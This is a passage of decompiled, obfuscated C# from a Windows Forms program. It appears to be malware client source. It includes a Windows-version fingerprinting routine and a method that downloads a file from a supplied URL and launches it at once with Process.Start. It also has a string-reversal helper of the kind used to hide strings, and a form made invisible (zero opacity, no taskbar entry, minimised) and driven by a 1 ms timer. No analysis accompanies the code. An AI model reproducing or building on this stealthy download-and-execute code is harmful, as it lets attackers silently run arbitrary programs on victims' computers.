				else if (oSVersion.Version.Minor == 2)
				{
					result = "2K3";
				}
				break;
			case 6:
				result = "VS";
				if (oSVersion.Version.Minor == 0)
				{
					result = "VS";
				}
				else if (oSVersion.Version.Minor == 1)
				{
					result = "W7";
				}
				break;
			}
			break;
		}
		return result;
	}

	private bool method_5(string string_11, string string_12)
	{
		if (((ServerComputer)Class2.smethod_0()).get_FileSystem().FileExists(string_12))
		{
			FileSystem.Kill(string_12);
		}
		try
		{
			((ServerComputer)Class2.smethod_0()).get_Network().DownloadFile(string_11, string_12);
			Process.Start(string_12);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
		return true;
	}

	public int method_6(int int_2, int int_3)
	{
		Random random = new Random();
		return random.Next(int_2, int_3);
	}

	private unsafe static string smethod_2(string string_11)
	{
		void* ptr = stackalloc byte[12];
		StringBuilder stringBuilder = new StringBuilder();
		*(int*)((byte*)ptr + 8) = string_11.Length;
		*(int*)ptr = 1;
		while (*(int*)ptr <= *(int*)((byte*)ptr + 8))
		{
			*(int*)((byte*)ptr + 4) = checked(string_11.Length - *unchecked((int*)ptr) + 1);
			stringBuilder.Append(Strings.Mid(string_11, *(int*)((byte*)ptr + 4), 1));
			checked
			{
				(*unchecked((int*)ptr))++;
			}
		}
		stringBuilder.ToString();
		return stringBuilder.ToString();
	}

	void Form.Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Expected O, but got Unknown
		icontainer_0 = new Container();
		vmethod_1(new Timer(icontainer_0));
		vmethod_3(new Timer(icontainer_0));
		vmethod_5(new TextBox());
		((Control)this).SuspendLayout();
		vmethod_2().set_Interval(1);
		TextBox obj = vmethod_4();
		Point location = new Point(12, 12);
		((Control)obj).set_Location(location);
		((TextBoxBase)vmethod_4()).set_MaxLength(327670000);
		vmethod_4().set_Multiline(true);
		((Control)vmethod_4()).set_Name("TextBox1");
		TextBox obj2 = vmethod_4();
		Size size = new Size(260, 238);
		((Control)obj2).set_Size(size);
		((Control)vmethod_4()).set_TabIndex(0);
		((TextBoxBase)vmethod_4()).set_WordWrap(false);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(284, 262);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)vmethod_4());
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual Timer vmethod_0()
	{
		return timer_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_1(Timer timer_2)
	{
		if (timer_0 != null)
		{
			timer_0.remove_Tick((EventHandler)timer_0_Tick);
		}
		timer_0 = timer_2;
		if (timer_0 != null)
		{
			timer_0.add_Tick((EventHandler)timer_0_Tick);
		}
	}

	[SpecialName]
	internal virtual Timer vmethod_2()
	{
		return timer_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_3(Timer timer_2)
	{
		if (timer_1 != null)
		{
			timer_1.remove_Tick((EventHandler)timer_1_Tick);
		}
		timer_1 = timer_2;
		if (timer_1 != null)
		{
			timer_1.add_Tick((EventHandler)timer_1_Tick);
		}
	}

	[SpecialName]
	internal virtual TextBox vmethod_4()
	{
		return textBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_5(TextBox textBox_1)
	{
		textBox_0 = textBox_1;
	}
}
